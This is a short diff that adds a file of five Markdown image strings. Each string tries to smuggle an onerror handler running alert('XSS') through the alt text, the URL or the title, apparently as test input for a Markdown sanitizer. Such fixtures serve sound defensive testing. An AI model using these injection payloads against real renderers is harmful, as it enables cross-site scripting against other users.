@@ -1,0 +1,5 @@
+![alt" onerror="alert('XSS')](https://example.com)
+![alt' onerror='alert("XSS")](https://example.com)
+![alt`onerror=`alert('XSS')](https://example.com)
+![alt"](https://example.com)onerror="alert('XSS'))
+![](https://example.com "title" onerror="alert('XSS')")
